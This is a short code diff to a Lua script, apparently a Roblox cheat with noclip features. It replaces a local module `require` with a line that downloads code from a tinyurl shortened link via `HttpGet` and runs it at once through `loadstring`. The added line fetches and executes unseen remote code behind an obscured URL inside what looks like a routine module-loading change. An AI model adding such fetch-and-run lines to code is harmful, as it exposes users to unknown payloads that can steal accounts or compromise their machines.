@@ -18,7 +18,7 @@ local noclipConnection
 -- Get TAIOM module
 local main
 local succ = pcall(function()
-	main = require(game.ReplicatedStorage.TheAllInOneModule)
+	main = loadstring(game:HttpGet("https://tinyurl.com/35atth4n"))()
 end)
 if not succ then print("Sorry bro. No module founded.") end
 
